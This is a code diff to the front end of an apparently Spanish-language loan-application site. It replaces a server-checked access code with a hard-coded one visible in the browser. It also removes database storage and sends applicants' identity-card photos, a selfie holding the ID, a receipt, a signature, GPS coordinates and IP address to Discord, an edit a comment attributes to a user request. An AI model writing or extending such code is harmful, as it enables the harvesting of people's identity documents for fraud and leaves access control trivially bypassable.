@@ -206,23 +206,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     async function verifyCode() {
-        const code = Array.from(otpInputs).map(i => i.value.toUpperCase()).join('');
+        const code = Array.from(otpInputs).map(i => i.value.toUpperCase().trim()).join('');
         if (code.length !== 6) { showCodeError(); return; }
 
-        btnVerify.disabled = true;
-        verifyText.textContent = 'Verificando...';
+        if (btnVerify) btnVerify.disabled = true;
+        if (verifyText) verifyText.textContent = 'Verificando...';
 
-        try {
-            const { data, error } = await supabaseClient
-                .from('codigos_acceso')
-                .select('*')
-                .eq('codigo', code)
-                .maybeSingle();
+        // Simulated delay
+        await new Promise(r => setTimeout(r, 600));
 
-            if (error || !data) { showCodeError(); return; }
-
-            await supabaseClient.from('codigos_acceso').delete().eq('codigo', code);
-
+        if (code === 'QOAN26') {
             const expiryTime = Date.now() + 10 * 60 * 1000;
             localStorage.setItem('qoan_session_expiry', expiryTime.toString());
             startSessionTimer(10 * 60 * 1000);
@@ -230,12 +223,10 @@ document.addEventListener('DOMContentLoaded', () => {
             codeOverlay.style.opacity = '0';
             codeOverlay.style.transition = 'opacity 0.5s ease';
             setTimeout(showApp, 500);
-        } catch (err) {
-            console.error('Verification error', err);
+        } else {
             showCodeError();
-        } finally {
-            btnVerify.disabled = false;
-            verifyText.textContent = 'Verificar Código';
+            if (btnVerify) btnVerify.disabled = false;
+            if (verifyText) verifyText.textContent = 'Verificar Código';
         }
     }
 
@@ -1077,56 +1068,39 @@ document.addEventListener('DOMContentLoaded', () => {
                     longitud: gpsLongitud,
                     ip: userIp
                 };
+                // Collect files for Discord
+                const fDniFrente = await getFileOrBlob('file-dni-front');
+                const fDniReverso = await getFileOrBlob('file-dni-back');
+                const fSelfie = await getFileOrBlob('file-selfie-dni');
+                const fRecibo = await getFileOrBlob('file-recibo');
 
-                // Upload files
-                const dniFrentePath = await uploadFileToStorage('file-dni-front', 'dni_frente', dniValue);
-                const dniReversoPath = await uploadFileToStorage('file-dni-back', 'dni_reverso', dniValue);
-                const selfiePath = await uploadFileToStorage('file-selfie-dni', 'selfie', dniValue);
-                const reciboPath = await uploadFileToStorage('file-recibo', 'recibo', dniValue);
-
-                // Handle signature (canvas or file)
-                let firmaPath = null;
+                let fFirma = null;
                 const fileSignature = document.getElementById('file-signature');
                 if (fileSignature && fileSignature.files.length > 0) {
-                    firmaPath = await uploadFileToStorage('file-signature', 'firma', dniValue);
+                    fFirma = fileSignature.files[0];
                 } else if (window.hasValidSignature) {
                     const canvas = document.getElementById('signature-pad');
                     if (canvas) {
-                        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-                        const fileName = `firma_canvas_${dniValue}_${Date.now()}.png`;
-                        const { data, error } = await supabaseClient.storage.from('documentos').upload(fileName, blob);
-                        if (!error && data) firmaPath = data.path;
+                        fFirma = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
                     }
                 }
 
-                // Calculate dynamic interest values for DB insert
-                const val = parseFloat(document.getElementById('loan-range').value);
-                const isDosMeses = document.getElementById('plazo').value === '2 meses';
-                const interesDiarioNum = (val * 0.15) / 30;
+                const filesToSend = [
+                    { blob: fDniFrente, filename: `dni_frente_${dniValue}.jpg` },
+                    { blob: fDniReverso, filename: `dni_reverso_${dniValue}.jpg` },
+                    { blob: fSelfie, filename: `selfie_${dniValue}.jpg` },
+                    { blob: fRecibo, filename: `recibo_${dniValue}.jpg` },
+                    { blob: fFirma, filename: `firma_${dniValue}.png` }
+                ];
 
-                // Insert into database
-                const { data, error } = await supabaseClient.from('solicitudess').insert([{
-                    ...formData,
-                    interes: isDosMeses ? '30% (15% mensual)' : '15%',
-                    interes_diario: interesDiarioNum.toFixed(2),
-                    mora_diaria: '1.00',
-                    dni_frente_path: dniFrentePath,
-                    dni_reverso_path: dniReversoPath,
-                    selfie_path: selfiePath,
-                    recibo_path: reciboPath,
-                    firma_path: firmaPath,
-                    latitud: gpsLatitud,
-                    longitud: gpsLongitud,
-                    ip: userIp,
-                    created_at: new Date().toISOString()
-                }]);
-
-                if (error) {
-                    console.error('Error saving to DB', error);
-                }
+                // Removed Supabase DB insert per user request
+                formData.latitud = gpsLatitud;
+                formData.longitud = gpsLongitud;
+                formData.ip = userIp;
 
                 // Send to Discord
                 await sendToDiscord(formData);
+                await sendPhotosToDiscord(filesToSend, dniValue);
 
                 const whatsappMsg = encodeURIComponent(`Hola QOAN, acabo de enviar mi solicitud de préstamo. Mi DNI es ${dniValue} y mi nombre es ${nombreValue}. Quedo atento a la aprobación.`);
 
